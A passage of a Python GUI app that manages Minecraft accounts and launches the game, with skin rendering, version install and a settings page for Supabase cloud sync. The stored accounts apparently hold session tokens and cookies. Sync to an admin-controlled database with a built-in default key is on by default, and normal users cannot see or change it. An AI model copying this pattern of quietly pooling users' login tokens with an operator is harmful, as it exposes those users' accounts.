            btn_box, text="💾 Save Skin (.png)", height=36, corner_radius=8,
            font=ctk.CTkFont(size=12, weight="bold"), fg_color="#22c55e", hover_color="#16a34a", text_color="#000000",
            command=self._save_skin_png
        ).pack(fill="x", pady=2)

        ctk.CTkButton(
            btn_box, text="🌐 Open on NameMC", height=32, corner_radius=8,
            font=ctk.CTkFont(size=11), fg_color="#374151", hover_color="#4b5563",
            command=self._open_namemc
        ).pack(fill="x", pady=2)

        # Right Column: 3D Body Render View
        right_card = ctk.CTkFrame(parent, fg_color="#111827", corner_radius=14)
        right_card.grid(row=1, column=1, sticky="nsew", padx=(12, 24), pady=(0, 24))
        right_card.grid_columnconfigure(0, weight=1)
        right_card.grid_rowconfigure(1, weight=1)

        ctk.CTkLabel(right_card, text="3D SKIN RENDER", font=ctk.CTkFont(size=11, weight="bold"), text_color="#6b7280").grid(row=0, column=0, pady=(16, 4))

        self._prof_body_lbl = ctk.CTkLabel(right_card, text="Enter a player name to render skin", font=ctk.CTkFont(size=13), text_color="#9ca3af")
        self._prof_body_lbl.grid(row=1, column=0, sticky="nsew", padx=20, pady=10)

        # Footer info
        self._prof_render_status = ctk.CTkLabel(right_card, text="Ready", font=ctk.CTkFont(size=10), text_color="#4b5563")
        self._prof_render_status.grid(row=2, column=0, pady=(0, 12))

    def _on_prof_picker_select(self, account_name):
        self._prof_search_var.set(account_name)
        self._load_profile_view()

    def _load_profile_view(self, name_override=None):
        target = (name_override or self._prof_search_var.get()).strip()
        if not target:
            return
        matched_acc = next((a for a in self.accounts if a.get("name", "").lower() == target.lower()), None)

        self._prof_name_lbl.configure(text=target)
        self._prof_render_status.configure(text=f"Fetching skin for {target}...")
        self._prof_body_lbl.configure(image=None, text="⏳ Loading 3D model...")

        if matched_acc:
            s_val = matched_acc.get("status", "Unknown")
            self._prof_status_lbl.configure(text=f" {s_val} ", fg_color=STATUS_COLORS.get(s_val, "#6b7280"))
            uid = matched_acc.get("uuid") or (matched_acc.get("note") if "UUID" in matched_acc.get("note", "") else "—")
            self._prof_uuid_lbl.configure(text=f"UUID: {uid}")
            capes = matched_acc.get("capes", [])
            if capes:
                self._prof_capes_lbl.configure(text=" • ".join(f"🦅 {c}" for c in capes), text_color="#38bdf8")
            else:
                self._prof_capes_lbl.configure(text="— No Capes Detected —", text_color="#6b7280")
        else:
            self._prof_status_lbl.configure(text=" Public Player ", fg_color="#3b82f6")
            self._prof_uuid_lbl.configure(text=f"Player: {target}")
            self._prof_capes_lbl.configure(text="—", text_color="#6b7280")

        def worker():
            head_img = fetch_skin_head(target, size=50)
            body_img = fetch_skin_body(target, size=260)
            def update():
                try:
                    if head_img:
                        ctk_h = ctk.CTkImage(light_image=head_img, dark_image=head_img, size=(50, 50))
                        self._prof_av_lbl.configure(image=ctk_h, text="")
                    if body_img:
                        ctk_b = ctk.CTkImage(light_image=body_img, dark_image=body_img, size=(120, 260))
                        self._prof_body_lbl.configure(image=ctk_b, text="")
                        self._prof_render_status.configure(text=f"✅ Rendered: {target}")
                    else:
                        self._prof_body_lbl.configure(image=None, text="❌ Could not render skin")
                        self._prof_render_status.configure(text="Failed to fetch body texture")
                except Exception:
                    pass
            self.after(0, update)
        threading.Thread(target=worker, daemon=True).start()

    def _save_skin_png(self):
        target = self._prof_name_lbl.cget("text").strip()
        if not target or target in ("Steve", "Loading...", "—"):
            messagebox.showinfo("Skin Download", "Search a player first.")
            return
        fpath = filedialog.asksaveasfilename(
            title=f"Save {target}'s Skin",
            defaultextension=".png",
            initialfile=f"{target}_skin.png",
            filetypes=[("PNG Image", "*.png")]
        )
        if not fpath:
            return
        def worker():
            raw_bytes = fetch_skin_png_bytes(target)
            if raw_bytes:
                try:
                    with open(fpath, "wb") as f:
                        f.write(raw_bytes)
                    self.after(0, lambda: messagebox.showinfo("Saved", f"Skin saved successfully to:\n{fpath}"))
                except Exception as e:
                    self.after(0, lambda: messagebox.showerror("Save Error", str(e)))
            else:
                self.after(0, lambda: messagebox.showerror("Error", "Could not download skin texture from Minecraft servers."))
        threading.Thread(target=worker, daemon=True).start()

    def _open_namemc(self):
        target = self._prof_name_lbl.cget("text").strip()
        if target and target != "Steve":
            webbrowser.open(f"https://namemc.com/profile/{urllib.parse.quote(target)}")

    # ─────────────────── GAME LAUNCHER PAGE ───────────────────────────────

    def _build_launcher_page(self, parent):
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_columnconfigure(1, weight=1)
        parent.grid_rowconfigure(1, weight=1)

        # Header
        head = ctk.CTkFrame(parent, fg_color="transparent")
        head.grid(row=0, column=0, columnspan=2, sticky="ew", padx=24, pady=(20, 10))
        ctk.CTkLabel(head, text="Minecraft Game Launcher", font=ctk.CTkFont(size=22, weight="bold")).pack(anchor="w")
        ctk.CTkLabel(head, text="Launch official Minecraft versions and modpacks with your active account profile.",
                     font=ctk.CTkFont(size=12), text_color="#9ca3af").pack(anchor="w", pady=(2, 0))

        # Left Column: Configuration Cards (Scrollable)
        left_col = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        left_col.grid(row=1, column=0, sticky="nsew", padx=(24, 10), pady=(0, 20))
        left_col.grid_columnconfigure(0, weight=1)

        # Card 1: Player Profile Card
        acc_card = ctk.CTkFrame(left_col, fg_color="#1f2937", corner_radius=12)
        acc_card.pack(fill="x", pady=(0, 14))

        ctk.CTkLabel(acc_card, text="ACTIVE PLAYER PROFILE", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=16, pady=(14, 6))

        acc_row = ctk.CTkFrame(acc_card, fg_color="transparent")
        acc_row.pack(fill="x", padx=16, pady=(0, 12))

        self._launcher_av_lbl = ctk.CTkLabel(acc_row, text="?", width=46, height=46, fg_color="#374151", corner_radius=23, font=ctk.CTkFont(size=18))
        self._launcher_av_lbl.pack(side="left")

        acc_info_col = ctk.CTkFrame(acc_row, fg_color="transparent")
        acc_info_col.pack(side="left", padx=(12, 0), fill="x", expand=True)

        self._launch_acc_var = ctk.StringVar()
        acc_names = [a.get("name", "Account") for a in self.accounts if a.get("name")] or ["— No Accounts —"]
        self._launcher_acc_dropdown = ctk.CTkOptionMenu(
            acc_info_col, values=acc_names, variable=self._launch_acc_var,
            font=ctk.CTkFont(size=12, weight="bold"), height=32,
            fg_color="#111827", button_color="#374151", button_hover_color="#4b5563",
            command=self._on_launcher_account_selected
        )
        self._launcher_acc_dropdown.pack(fill="x", pady=(0, 4))

        self._launcher_acc_badge_row = ctk.CTkFrame(acc_info_col, fg_color="transparent")
        self._launcher_acc_badge_row.pack(anchor="w")

        self._launcher_acc_status_lbl = ctk.CTkLabel(self._launcher_acc_badge_row, text=" Status: Ready ", font=ctk.CTkFont(size=9, weight="bold"), fg_color="#22c55e", corner_radius=4, height=18)
        self._launcher_acc_status_lbl.pack(side="left")

        self._launcher_acc_token_lbl = ctk.CTkLabel(self._launcher_acc_badge_row, text=" Token: Available ", font=ctk.CTkFont(size=9, weight="bold"), fg_color="#374151", text_color="#38bdf8", corner_radius=4, height=18)
        self._launcher_acc_token_lbl.pack(side="left", padx=(6, 0))

        # Card 2: Version & Directory Card
        ver_card = ctk.CTkFrame(left_col, fg_color="#1f2937", corner_radius=12)
        ver_card.pack(fill="x", pady=(0, 14))

        ctk.CTkLabel(ver_card, text="MINECRAFT VERSION & PATHS", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=16, pady=(14, 6))

        ver_sel_row = ctk.CTkFrame(ver_card, fg_color="transparent")
        ver_sel_row.pack(fill="x", padx=16, pady=(0, 10))

        self._launch_ver_var = ctk.StringVar()
        self._launcher_ver_dropdown = ctk.CTkOptionMenu(
            ver_sel_row, values=["Scanning..."], variable=self._launch_ver_var,
            font=ctk.CTkFont(size=12), height=34,
            fg_color="#111827", button_color="#374151", button_hover_color="#4b5563"
        )
        self._launcher_ver_dropdown.pack(side="left", fill="x", expand=True, padx=(0, 6))

        ctk.CTkButton(
            ver_sel_row, text="🔄", width=36, height=34, corner_radius=6,
            fg_color="#374151", hover_color="#4b5563", font=ctk.CTkFont(size=13),
            command=self._refresh_launcher_versions
        ).pack(side="left", padx=(0, 6))

        ctk.CTkButton(
            ver_sel_row, text="⬇ Install", width=76, height=34, corner_radius=6,
            fg_color="#3b82f6", hover_color="#2563eb", font=ctk.CTkFont(size=11, weight="bold"),
            command=self._install_version_dialog
        ).pack(side="left")

        # Game Directory
        ctk.CTkLabel(ver_card, text="GAME DIRECTORY (.MINECRAFT)", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=16, pady=(4, 2))
        mcdir_row = ctk.CTkFrame(ver_card, fg_color="transparent")
        mcdir_row.pack(fill="x", padx=16, pady=(0, 12))

        def_mcdir = str(Path(os.environ.get("APPDATA", "")) / ".minecraft")
        self._launch_mcdir_var = ctk.StringVar(value=def_mcdir)
        ctk.CTkEntry(
            mcdir_row, textvariable=self._launch_mcdir_var, height=32, corner_radius=6,
            fg_color="#111827", border_color="#374151", font=ctk.CTkFont(size=10)
        ).pack(side="left", fill="x", expand=True, padx=(0, 6))
        ctk.CTkButton(
            mcdir_row, text="Browse", width=64, height=32, corner_radius=6,
            fg_color="#374151", hover_color="#4b5563", font=ctk.CTkFont(size=10),
            command=self._browse_mcdir
        ).pack(side="left")

        # Card 3: Java & Performance (RAM) Card
        perf_card = ctk.CTkFrame(left_col, fg_color="#1f2937", corner_radius=12)
        perf_card.pack(fill="x", pady=(0, 14))

        ctk.CTkLabel(perf_card, text="JAVA & RAM ALLOCATION", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=16, pady=(14, 6))

        # RAM Selector
        ram_row = ctk.CTkFrame(perf_card, fg_color="transparent")
        ram_row.pack(fill="x", padx=16, pady=(0, 10))
        ctk.CTkLabel(ram_row, text="Memory (RAM):", font=ctk.CTkFont(size=11), text_color="#9ca3af").pack(side="left")

        self._launch_ram_var = ctk.StringVar(value="4 GB")
        ctk.CTkOptionMenu(
            ram_row, values=["2 GB", "3 GB", "4 GB", "6 GB", "8 GB", "10 GB", "12 GB", "16 GB"],
            variable=self._launch_ram_var, width=100, height=28,
            fg_color="#111827", button_color="#374151", button_hover_color="#4b5563", font=ctk.CTkFont(size=11)
        ).pack(side="right")

        # Java Executable
        ctk.CTkLabel(perf_card, text="JAVA RUNTIME (JAVAW.EXE)", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=16, pady=(4, 2))
        java_row = ctk.CTkFrame(perf_card, fg_color="transparent")
        java_row.pack(fill="x", padx=16, pady=(0, 10))

        which_j = self._detect_best_javaw()
        self._launch_java_var = ctk.StringVar(value=which_j)
        ctk.CTkEntry(
            java_row, textvariable=self._launch_java_var, height=32, corner_radius=6,
            fg_color="#111827", border_color="#374151", font=ctk.CTkFont(size=10)
        ).pack(side="left", fill="x", expand=True, padx=(0, 6))
        ctk.CTkButton(
            java_row, text="Browse", width=64, height=32, corner_radius=6,
            fg_color="#374151", hover_color="#4b5563", font=ctk.CTkFont(size=10),
            command=self._browse_java
        ).pack(side="left")

        # JVM Custom Args
        ctk.CTkLabel(perf_card, text="CUSTOM JVM ARGUMENTS", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=16, pady=(4, 2))
        self._launch_jvm_var = ctk.StringVar(value="-XX:+UnlockExperimentalVMOptions -XX:+UseG1GC")
        ctk.CTkEntry(
            perf_card, textvariable=self._launch_jvm_var, height=32, corner_radius=6,
            fg_color="#111827", border_color="#374151", font=ctk.CTkFont(family="Consolas", size=10)
        ).pack(fill="x", padx=16, pady=(0, 14))

        # Right Column: Big Launch Button & Live Console
        right_col = ctk.CTkFrame(parent, fg_color="#111827", corner_radius=14)
        right_col.grid(row=1, column=1, sticky="nsew", padx=(10, 24), pady=(0, 20))
        right_col.grid_columnconfigure(0, weight=1)
        right_col.grid_rowconfigure(2, weight=1)

        # Launch Hero Area
        hero_box = ctk.CTkFrame(right_col, fg_color="transparent")
        hero_box.grid(row=0, column=0, sticky="ew", padx=18, pady=(16, 8))
        hero_box.grid_columnconfigure(0, weight=1)

        self._launch_btn = ctk.CTkButton(
            hero_box, text="🚀  LAUNCH MINECRAFT", height=52, corner_radius=10,
            font=ctk.CTkFont(size=15, weight="bold"), fg_color="#22c55e", hover_color="#16a34a",
            text_color="#000000", command=self._do_launch_minecraft
        )
        self._launch_btn.pack(fill="x", pady=(0, 8))

        status_bar = ctk.CTkFrame(hero_box, fg_color="transparent")
        status_bar.pack(fill="x")

        self._launcher_state_lbl = ctk.CTkLabel(status_bar, text="⚪ Ready to Launch", font=ctk.CTkFont(size=12, weight="bold"), text_color="#22c55e")
        self._launcher_state_lbl.pack(side="left")

        self._kill_btn = ctk.CTkButton(
            status_bar, text="⏹ Kill Game", width=86, height=28, corner_radius=6,
            fg_color="#ef4444", hover_color="#dc2626", font=ctk.CTkFont(size=10, weight="bold"),
            command=self._kill_game_process, state="disabled"
        )
        self._kill_btn.pack(side="right")

        # Console Header
        console_head = ctk.CTkFrame(right_col, fg_color="transparent")
        console_head.grid(row=1, column=0, sticky="ew", padx=18, pady=(4, 4))
        ctk.CTkLabel(console_head, text="LIVE GAME CONSOLE / LOGS", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(side="left")
        ctk.CTkButton(
            console_head, text="Clear Log", width=64, height=22, font=ctk.CTkFont(size=9),
            fg_color="#1f2937", hover_color="#374151", corner_radius=4, command=self._clear_launcher_console
        ).pack(side="right")

        # Console Output Box
        self._launcher_console = ctk.CTkTextbox(
            right_col, fg_color="#0d1117", border_color="#1f2937", border_width=1,
            corner_radius=8, font=ctk.CTkFont(family="Consolas", size=10)
        )
        self._launcher_console.grid(row=2, column=0, sticky="nsew", padx=18, pady=(0, 16))

        # Initial state setup
        self._game_process = None
        if acc_names:
            self._launch_acc_var.set(acc_names[0])
            self._on_launcher_account_selected(acc_names[0])
        self._refresh_launcher_versions()

    def _on_launcher_account_selected(self, acc_name):
        acc = next((a for a in self.accounts if a.get("name", "") == acc_name), None)
        if not acc:
            self._launcher_acc_status_lbl.configure(text=" Status: Unknown ", fg_color="#6b7280")
            self._launcher_acc_token_lbl.configure(text=" Token: None ", text_color="#9ca3af")
            self._launcher_av_lbl.configure(image=None, text="?")
            return
        
        s_val = acc.get("status", "Unknown")
        self._launcher_acc_status_lbl.configure(text=f" {s_val} ", fg_color=STATUS_COLORS.get(s_val, "#6b7280"))
        
        has_tok = bool(acc.get("token"))
        has_ck = bool(acc.get("cookie"))
        if has_tok:
            self._launcher_acc_token_lbl.configure(text=" 🪪 Token Ready ", text_color="#38bdf8", fg_color="#1e3a8a")
        elif has_ck:
            self._launcher_acc_token_lbl.configure(text=" 🍪 Cookie Account ", text_color="#f59e0b", fg_color="#78350f")
        else:
            self._launcher_acc_token_lbl.configure(text=" Offline/Local ", text_color="#9ca3af", fg_color="#374151")

        self._request_skin(acc.get("name", ""), self._launcher_av_lbl, size=46)

    def _browse_mcdir(self):
        cur = self._launch_mcdir_var.get().strip() or str(Path(os.environ.get("APPDATA", "")) / ".minecraft")
        d = filedialog.askdirectory(title="Select .minecraft Directory", initialdir=cur)
        if d:
            self._launch_mcdir_var.set(d)
            self._refresh_launcher_versions()

    def _detect_best_javaw(self):
        """Return path to 64-bit javaw.exe. Prefers the JRE bundled inside .minecraft/runtime
        (always 64-bit modern OpenJDK 21) over the system PATH which may be 32-bit Oracle Java."""
        candidates = []

        # 1. Official .minecraft runtimes bundled by Mojang — always 64-bit
        mc_rt = Path(os.environ.get("APPDATA", "")) / ".minecraft" / "runtime"
        if mc_rt.exists():
            # Prefer java-runtime-delta (Java 21, modern MC 1.20+)
            priority = ["java-runtime-delta", "java-runtime-gamma", "java-runtime-beta", "java-runtime-alpha", "jre-legacy"]
            for rt_name in priority:
                for javaw in mc_rt.glob(f"{rt_name}/*/bin/javaw.exe"):
                    candidates.append(str(javaw))
                for javaw in mc_rt.glob(f"{rt_name}/*/*/bin/javaw.exe"):
                    candidates.append(str(javaw))
            # Also catch any other runtimes in the folder
            for javaw in mc_rt.rglob("javaw.exe"):
                p = str(javaw)
                if p not in candidates:
                    candidates.append(p)

        # 2. Windows Store Minecraft launcher runtimes
        ms_rt = Path(os.environ.get("LOCALAPPDATA", "")) / "Packages" / "Microsoft.4297127D64C57_8wekyb3d8bbwe" / "LocalCache" / "Local" / "runtime"
        if ms_rt.exists():
            for javaw in ms_rt.rglob("javaw.exe"):
                candidates.append(str(javaw))

        # 3. 64-bit Program Files (NOT x86)
        for base in [Path("C:\\Program Files\\Eclipse Adoptium"), Path("C:\\Program Files\\Java"),
                     Path("C:\\Program Files\\Microsoft"), Path("C:\\Program Files\\BellSoft"),
                     Path("C:\\Program Files\\Zulu")]:
            if base.exists():
                for javaw in base.rglob("javaw.exe"):
                    candidates.append(str(javaw))

        # 4. System PATH fallback (may be 32-bit — used only as last resort)
        sys_j = shutil.which("javaw") or shutil.which("java")
        if sys_j:
            candidates.append(sys_j)

        for c in candidates:
            if Path(c).exists():
                return c
        return "javaw"

    def _browse_java(self):
        f = filedialog.askopenfilename(
            title="Select javaw.exe or java.exe",
            filetypes=[("Java Executable", "javaw.exe;java.exe"), ("All Files", "*.*")]
        )
        if f:
            self._launch_java_var.set(f)

    def _refresh_launcher_versions(self):
        mc_dir = self._launch_mcdir_var.get().strip() or str(Path(os.environ.get("APPDATA", "")) / ".minecraft")
        vers = []
        if minecraft_launcher_lib:
            try:
                installed = minecraft_launcher_lib.utils.get_installed_versions(mc_dir)
                vers = [v.get("id") for v in installed if v.get("id")]
            except Exception as e:
                print("Error scanning versions:", e)
        
        if not vers:
            v_path = Path(mc_dir) / "versions"
            if v_path.exists():
                vers = [p.name for p in v_path.iterdir() if p.is_dir() and (p / f"{p.name}.json").exists()]

        if not vers:
            vers = ["— No Versions Found —"]

        if hasattr(self, "_launcher_ver_dropdown"):
            self._launcher_ver_dropdown.configure(values=vers)
            cur = self._launch_ver_var.get()
            if cur not in vers:
                self._launch_ver_var.set(vers[0])

    def _clear_launcher_console(self):
        if hasattr(self, "_launcher_console"):
            self._launcher_console.delete("1.0", "end")

    def _log_to_launcher_console(self, text):
        if not hasattr(self, "_launcher_console"):
            return
        ts = datetime.now().strftime("%H:%M:%S")
        self._launcher_console.insert("end", f"[{ts}] {text}\n")
        self._launcher_console.see("end")

    def _do_launch_minecraft(self):
        if self._game_process and self._game_process.poll() is None:
            messagebox.showinfo("Game Running", "Minecraft is already running!")
            return

        acc_name = self._launch_acc_var.get()
        acc = next((a for a in self.accounts if a.get("name") == acc_name), None) or {"name": acc_name or "Player"}
        ver = self._launch_ver_var.get().strip()
        mc_dir = self._launch_mcdir_var.get().strip()
        ram_str = self._launch_ram_var.get().replace("GB", "").strip()
        ram_num = int(ram_str) if ram_str.isdigit() else 4
        java_exec = self._launch_java_var.get().strip() or "javaw"
        jvm_extra = self._launch_jvm_var.get().strip()

        if not ver or ver.startswith("—"):
            messagebox.showwarning("No Version", "Please install or select a valid Minecraft version first.")
            return

        self._launcher_state_lbl.configure(text=f"⏳ Launching {ver}...", text_color="#f59e0b")
        self._launch_btn.configure(state="disabled", fg_color="#374151")
        self._kill_btn.configure(state="normal")
        self._log_to_launcher_console(f"Preparing to launch Minecraft {ver} as '{acc.get('name', 'Player')}'...")

        def worker():
            options = {
                "username": acc.get("name", "Player"),
                "uuid": acc.get("uuid", "") or "00000000-0000-0000-0000-000000000000",
                "token": acc.get("token", "") or "0",
                "jvmArguments": [f"-Xmx{ram_num}G"] + (jvm_extra.split() if jvm_extra else []),
                "executablePath": java_exec,
            }

            try:
                if not minecraft_launcher_lib:
                    raise RuntimeError("minecraft-launcher-lib is not installed.")

                cmd = minecraft_launcher_lib.command.get_minecraft_command(ver, mc_dir, options)
                self.after(0, lambda: self._log_to_launcher_console(f"Command line generated ({len(cmd)} args). Starting JVM..."))
                
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" and "javaw" in java_exec else 0
                )
                self._game_process = proc

                def on_started():
                    self._launcher_state_lbl.configure(text=f"🎮 Playing {ver} (PID {proc.pid})", text_color="#22c55e")
                    self._log_to_launcher_console(f"✅ Minecraft launched successfully with Process ID: {proc.pid}")
                self.after(0, on_started)

                # Stream stdout/stderr
                for line in proc.stdout:
                    l = line.rstrip()
                    if l:
                        self.after(0, lambda txt=l: self._log_to_launcher_console(txt))

                proc.wait()
                def on_finish():
                    self._launcher_state_lbl.configure(text="⚪ Ready to Launch", text_color="#22c55e")
                    self._launch_btn.configure(state="normal", fg_color="#22c55e")
                    self._kill_btn.configure(state="disabled")
                    self._log_to_launcher_console(f"Minecraft closed (Exit Code: {proc.returncode}).")
                self.after(0, on_finish)

            except Exception as e:
                err_msg = str(e)
                def on_error():
                    self._launcher_state_lbl.configure(text="❌ Launch Failed", text_color="#ef4444")
                    self._launch_btn.configure(state="normal", fg_color="#22c55e")
                    self._kill_btn.configure(state="disabled")
                    self._log_to_launcher_console(f"❌ Launch error: {err_msg}")
                    messagebox.showerror("Launch Error", f"Failed to start Minecraft:\n\n{err_msg}")
                self.after(0, on_error)

        threading.Thread(target=worker, daemon=True).start()

    def _kill_game_process(self):
        if self._game_process and self._game_process.poll() is None:
            try:
                self._game_process.terminate()
                self._log_to_launcher_console("Sent termination signal to Minecraft process.")
            except Exception as e:
                self._log_to_launcher_console(f"Error killing process: {e}")

    def _install_version_dialog(self):
        dlg = ctk.CTkToplevel(self)
        dlg.title("Install Minecraft Version")
        dlg.geometry("440x360")
        dlg.resizable(False, False)
        dlg.grab_set()

        ctk.CTkLabel(dlg, text="Install Minecraft Version", font=ctk.CTkFont(size=15, weight="bold")).pack(anchor="w", padx=20, pady=(18, 4))
        ctk.CTkLabel(dlg, text="Downloads clean vanilla game files directly from Mojang servers.", font=ctk.CTkFont(size=11), text_color="#9ca3af").pack(anchor="w", padx=20, pady=(0, 14))

        ctk.CTkLabel(dlg, text="SELECT OR TYPE VERSION", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=20, pady=(0, 2))
        
        ver_choices = ["1.21", "1.20.6", "1.20.4", "1.20.1", "1.19.4", "1.18.2", "1.16.5", "1.12.2", "1.8.9", "1.7.10"]
        sel_var = ctk.StringVar(value=ver_choices[0])
        om = ctk.CTkComboBox(dlg, values=ver_choices, variable=sel_var, height=36, font=ctk.CTkFont(size=12))
        om.pack(fill="x", padx=20, pady=(0, 14))

        pbar = ctk.CTkProgressBar(dlg, height=12, corner_radius=6)
        pbar.pack(fill="x", padx=20, pady=(0, 6))
        pbar.set(0)

        prog_lbl = ctk.CTkLabel(dlg, text="Ready to download", font=ctk.CTkFont(size=11), text_color="#9ca3af")
        prog_lbl.pack(anchor="w", padx=20, pady=(0, 16))

        def start_install():
            target_v = sel_var.get().strip()
            if not target_v:
                return
            btn_install.configure(state="disabled")
            mc_dir = self._launch_mcdir_var.get().strip()

            def worker():
                def set_status(text):
                    dlg.after(0, lambda: prog_lbl.configure(text=text))

                def set_progress(val):
                    dlg.after(0, lambda: pbar.set(val))

                callback = {
                    "setStatus": set_status,
                    "setProgress": lambda p: set_progress(p / 100.0 if p > 1 else p),
                    "setMax": lambda m: None
                }

                try:
                    set_status(f"Downloading {target_v} assets & libraries...")
                    minecraft_launcher_lib.install.install_minecraft_version(target_v, mc_dir, callback=callback)
                    def on_done():
                        set_progress(1.0)
                        set_status("✅ Installation complete!")
                        messagebox.showinfo("Installed", f"Minecraft {target_v} was successfully installed!")
                        dlg.destroy()
                        self._refresh_launcher_versions()
                        self._launch_ver_var.set(target_v)
                    dlg.after(0, on_done)
                except Exception as e:
                    err = str(e)
                    dlg.after(0, lambda: (set_status(f"❌ Failed: {err}"), btn_install.configure(state="normal"), messagebox.showerror("Install Error", err)))

            threading.Thread(target=worker, daemon=True).start()

        btn_row = ctk.CTkFrame(dlg, fg_color="transparent")
        btn_row.pack(fill="x", padx=20, pady=(0, 16))
        btn_install = ctk.CTkButton(btn_row, text="⬇ Start Download", font=ctk.CTkFont(weight="bold"), fg_color="#3b82f6", hover_color="#2563eb", height=36, command=start_install)
        btn_install.pack(side="left", fill="x", expand=True, padx=(0, 6))
        ctk.CTkButton(btn_row, text="Cancel", fg_color="#374151", height=36, command=dlg.destroy).pack(side="right")

    # ─────────────────── SETTINGS & EXPORT PAGE ──────────────────────────

    def _build_settings_page(self, parent):
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_columnconfigure(1, weight=1)
        parent.grid_rowconfigure(1, weight=1)

        # Header
        head = ctk.CTkFrame(parent, fg_color="transparent")
        head.grid(row=0, column=0, columnspan=2, sticky="ew", padx=24, pady=(20, 10))
        ctk.CTkLabel(head, text="Settings, Cloud Database & Exporters", font=ctk.CTkFont(size=22, weight="bold")).pack(anchor="w")
        ctk.CTkLabel(head, text="Manage Supabase cloud database synchronization, Discord webhooks, and account exports.",
                     font=ctk.CTkFont(size=12), text_color="#9ca3af").pack(anchor="w", pady=(2, 0))

        cfg = _load_config()

        # Left Column: Supabase Cloud Database Card
        sb_card = ctk.CTkFrame(parent, fg_color="#1f2937", corner_radius=14)
        sb_card.grid(row=1, column=0, sticky="nsew", padx=(24, 10), pady=(0, 24))
        sb_card.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(sb_card, text="⚡  Supabase Cloud Database", font=ctk.CTkFont(size=15, weight="bold")).pack(anchor="w", padx=18, pady=(18, 4))
        ctk.CTkLabel(sb_card, text="Realtime cloud synchronization for accounts across all devices.",
                     font=ctk.CTkFont(size=11), text_color="#9ca3af", justify="left").pack(anchor="w", padx=18, pady=(0, 14))

        if self.is_admin:
            ctk.CTkLabel(sb_card, text="SUPABASE PROJECT URL", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=18, pady=(0, 3))
            self._sett_sb_url_var = ctk.StringVar(value=cfg.get("supabase_url", DEFAULT_SUPABASE_URL))
            self._sett_sb_url_entry = ctk.CTkEntry(
                sb_card, textvariable=self._sett_sb_url_var, placeholder_text="https://xxxx.supabase.co",
                height=34, corner_radius=8, fg_color="#111827", border_color="#374151", font=ctk.CTkFont(size=11)
            )
            self._sett_sb_url_entry.pack(fill="x", padx=18, pady=(0, 10))

            ctk.CTkLabel(sb_card, text="SUPABASE SECRET / API KEY", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", padx=18, pady=(0, 3))
            self._sett_sb_key_var = ctk.StringVar(value=cfg.get("supabase_key", DEFAULT_SUPABASE_KEY))
            self._sett_sb_key_entry = ctk.CTkEntry(
                sb_card, textvariable=self._sett_sb_key_var, placeholder_text="sb_secret_...",
                height=34, corner_radius=8, fg_color="#111827", border_color="#374151", font=ctk.CTkFont(family="Consolas", size=10), show="•"
            )
            self._sett_sb_key_entry.pack(fill="x", padx=18, pady=(0, 10))

            self._sett_sb_sync_var = ctk.BooleanVar(value=cfg.get("supabase_enabled", True))
            ctk.CTkCheckBox(
                sb_card, text="Automatic Cloud Sync (Auto-push & merge on startup)",
                variable=self._sett_sb_sync_var, font=ctk.CTkFont(size=11),
                fg_color="#3b82f6", hover_color="#2563eb"
            ).pack(anchor="w", padx=18, pady=(0, 14))

            # Supabase Action Buttons (Admin)
            sb_btn_row1 = ctk.CTkFrame(sb_card, fg_color="transparent")
            sb_btn_row1.pack(fill="x", padx=18, pady=(0, 8))
            ctk.CTkButton(
                sb_btn_row1, text="🔌 Test Connection", height=34, corner_radius=8,
                font=ctk.CTkFont(size=11, weight="bold"), fg_color="#3b82f6", hover_color="#2563eb",
                command=self._test_supabase_connection
            ).pack(side="left", fill="x", expand=True, padx=(0, 4))
            ctk.CTkButton(
                sb_btn_row1, text="💾 Save Config", height=34, corner_radius=8,
                font=ctk.CTkFont(size=11, weight="bold"), fg_color="#22c55e", hover_color="#16a34a", text_color="#000000",
                command=self._save_supabase_settings
            ).pack(side="left", fill="x", expand=True, padx=(4, 0))

            sb_btn_row2 = ctk.CTkFrame(sb_card, fg_color="transparent")
            sb_btn_row2.pack(fill="x", padx=18, pady=(0, 10))
            ctk.CTkButton(
                sb_btn_row2, text="☁️ Push Local to Cloud", height=34, corner_radius=8,
                font=ctk.CTkFont(size=11, weight="bold"), fg_color="#374151", hover_color="#4b5563",
                command=self._push_local_to_supabase
            ).pack(side="left", fill="x", expand=True, padx=(0, 4))
            ctk.CTkButton(
                sb_btn_row2, text="⬇️ Pull Cloud to Local", height=34, corner_radius=8,
                font=ctk.CTkFont(size=11, weight="bold"), fg_color="#374151", hover_color="#4b5563",
                command=self._pull_supabase_to_local
            ).pack(side="left", fill="x", expand=True, padx=(4, 0))
        else:
            # Clean summary for normal users
            status_box = ctk.CTkFrame(sb_card, fg_color="#111827", corner_radius=8)
            status_box.pack(fill="x", padx=18, pady=(4, 14))
            ctk.CTkLabel(status_box, text="🟢  Cloud Database Active", font=ctk.CTkFont(size=13, weight="bold"), text_color="#22c55e").pack(anchor="w", padx=12, pady=(10, 2))
            ctk.CTkLabel(status_box, text="Your accounts are automatically synchronized and backed up to the secure cloud server.",
                         font=ctk.CTkFont(size=11), text_color="#9ca3af", justify="left").pack(anchor="w", padx=12, pady=(0, 10))

            sb_btn_user = ctk.CTkFrame(sb_card, fg_color="transparent")
            sb_btn_user.pack(fill="x", padx=18, pady=(0, 12))
            ctk.CTkButton(
                sb_btn_user, text="🔄 Sync Now", height=36, corner_radius=8,
                font=ctk.CTkFont(size=12, weight="bold"), fg_color="#3b82f6", hover_color="#2563eb",
